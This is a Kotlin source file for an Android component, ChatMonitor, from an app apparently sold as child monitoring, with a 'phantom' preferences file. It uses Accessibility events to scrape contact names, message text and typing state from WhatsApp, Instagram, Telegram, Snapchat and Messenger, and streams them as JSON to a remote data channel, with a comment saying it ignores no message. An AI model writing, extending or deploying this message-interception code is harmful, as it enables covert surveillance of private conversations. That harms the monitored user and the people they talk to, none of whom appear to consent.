package com.soumo.child.components.chat

import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap
import kotlin.coroutines.CoroutineContext

/**
 * ChatMonitor - central async processor for Accessibility events -> Chat payloads.
 */
@Suppress("DEPRECATION")
class ChatMonitor private constructor(private val appContext: Context) : CoroutineScope {

    companion object {
        @Volatile private var _instance: ChatMonitor? = null
        fun init(context: Context) {
            _instance = ChatMonitor(context.applicationContext)
        }
        val instance: ChatMonitor
            get() = _instance ?: throw IllegalStateException("ChatMonitor not initialized")
    }

    private val job = SupervisorJob()
    override val coroutineContext: CoroutineContext = Dispatchers.IO + job

    // ----- config -----
    private val allowedPackages = setOf(
        "com.whatsapp",
        "com.instagram.android",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.facebook.orca",
        "com.facebook.katana"
    )

    // tweakables (tune these)
    private val minTextLength = 0                 // I don't want to ignore any message.
    private val perContactDebounceMs = 700L       // don't send more than once per contact within this window

    // keep track when last payload was sent per contact
    private val lastSentAt = ConcurrentHashMap<String, Long>()

    // state
    @Volatile private var dataClient: DataChannelClient? = null
    fun setDataChannelClient(client: DataChannelClient?) {
        dataClient = client
    }

    private val extractors = ConcurrentHashMap<String, ChatExtractor>()
    private val lastSeenHash = ConcurrentHashMap<String, String>() // key = app|contactId -> last hash

    fun registerExtractor(pkg: String, extractor: ChatExtractor) {
        extractors[pkg] = extractor
    }

    /** Main entry point from AccessibilityService (must be tiny & non-blocking). */
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return

            // ---- WHITELIST: ignore everything except the apps we care about ----
            if (!allowedPackages.contains(pkg)) {
                // Quick optimization: still allow APP_FOREGROUND events if you want to watch app-switches,
                // but default is quiet mode to avoid system noise.
                return
            }

            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    // Foreground notifications for these apps, keep it.
                    launch { handleWindowStateChanged(pkg, event) }
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                    launch { handleEvent(pkg, event) }
                }
                else -> { /* ignore */ }
            }
        } catch (t: Throwable) {
            Log.e("ChatMonitor", "onAccessibilityEvent error", t)
        }
    }


    private suspend fun handleWindowStateChanged(pkg: String, event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val root = event.source ?: return@withContext
            try {
                val extractor = extractors[pkg] ?: GenericChatExtractor(pkg)
                val contactId = extractor.extractContactId(root) ?: "unknown"
                val contactName = extractor.extractContactName(root)
                val visible = extractor.extractVisibleMessages(root)
                // Build and send APP_FOREGROUND payload
                val body = AppForegroundBody(
                    packageName = pkg,
                    contactId = contactId,
                    contactName = contactName,
                    visibleMessages = visible
                )
                val payload = ChatPayload(childId = getChildId(), type = PayloadType.APP_FOREGROUND, body = body)
                sendPayload(payload)
            } catch (e: Exception) {
                Log.e("ChatMonitor", "handleWindowStateChanged error", e)
            } finally {
                root.recycle()
            }
        }
    }

    private suspend fun handleEvent(pkg: String, event: AccessibilityEvent) {
        withContext(Dispatchers.Default) {
            val root = event.source ?: return@withContext
            try {
                val extractor = extractors[pkg] ?: GenericChatExtractor(pkg)
                val contactId = extractor.extractContactId(root) ?: "unknown"
                val contactName = extractor.extractContactName(root)
                val typing = extractor.extractTypingState(root)
                typing?.let { sendTyping(pkg, contactId, contactName, it) }

                var visible = extractor.extractVisibleMessages(root)

                // ---- filter tiny/noisy nodes + numeric noise ----
                visible = visible.filter {
                    val txt = it.text
                    txt != null && txt.trim().length >= minTextLength && !isMostlyNumeric(txt.trim())
                }

                // ---- dedupe / debounce per contact ----
                val now = System.currentTimeMillis()
                val key = "$pkg|$contactId"
                val last = lastSentAt[key] ?: 0L
                if ((now - last) < perContactDebounceMs) {
                    // skip extra chatter
                    return@withContext
                }

                val newMessages = filterNewMessages(pkg, contactId, visible)
                if (newMessages.isNotEmpty()) {
                    // mark last send time (debounce)
                    lastSentAt[key] = now
                    sendMessages(pkg, contactId, contactName, newMessages)
                }
            } catch (e: Exception) {
                Log.e("ChatMonitor", "handleEvent error", e)
            } finally {
                root.recycle()
            }
        }
    }

    private fun isMostlyNumeric(s: String): Boolean {
        // if a string is >60% digits/dots then it's likely a status metric (KB/s, 0.42 etc.)
        val numeric = s.replace("[^0-9.]".toRegex(), "")
        return numeric.length >= (s.length * 0.6)
    }

    private fun filterNewMessages(pkg: String, contactId: String, visible: List<MessageData>): List<MessageData> {
        if (visible.isEmpty()) return emptyList()
        val key = "$pkg|$contactId"
        val combined = visible.joinToString("|") { it.msgId }
        val h = sha256Hex(combined)
        val last = lastSeenHash[key]
        return if (h == last) {
            emptyList()
        } else {
            lastSeenHash[key] = h
            visible
        }
    }

    private fun sendTyping(pkg: String, contactId: String, contactName: String?, typing: TypingState) {
        val body = TypingEventBody(app = pkg, contactId = contactId, contactName = contactName, isTyping = typing.isTyping)
        val payload = ChatPayload(childId = getChildId(), type = PayloadType.TYPING, body = body)
        sendPayload(payload)
    }

    private fun sendMessages(pkg: String, contactId: String, contactName: String?, messages: List<MessageData>) {
        val body = MessageEventBody(app = pkg, contactId = contactId, contactName = contactName, messages = messages)
        val payload = ChatPayload(childId = getChildId(), type = PayloadType.MESSAGE, body = body)
        sendPayload(payload)
    }

    private fun sendPayload(payload: ChatPayload) {
        val json = ChatJson.toJson(payload)
        val client = dataClient
        val sent = try {
            client?.send(json) ?: false
        } catch (t: Throwable) {
            Log.e("ChatMonitor", "sendPayload error", t); false
        }
        if (!sent) {
            // Fallback: The BackgroundService holds the durable queue. We just log here.
            Log.w("ChatMonitor", "DataChannel not ready; payload not sent - needs queueing in BackgroundService")
        }
    }

    private fun getChildId(): String {
        // Use SharedPreferences to return the configured device id. This uses appContext now.
        try {
            val prefs = appContext.getSharedPreferences("phantom_prefs", Context.MODE_PRIVATE)
            return prefs.getString("device_id", "CHILD-UNKNOWN") ?: "CHILD-UNKNOWN"
        } catch (_: Throwable) {
            return "CHILD-UNKNOWN"
        }
    }

    fun shutdown() {
        job.cancel()
    }

    private fun sha256Hex(input: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(input.toByteArray(Charsets.UTF_8))
        return digest.joinToString("") { "%02x".format(it) }
    }
}

enum class PayloadType { MESSAGE, TYPING, APP_FOREGROUND }

data class TypingState(val isTyping: Boolean)
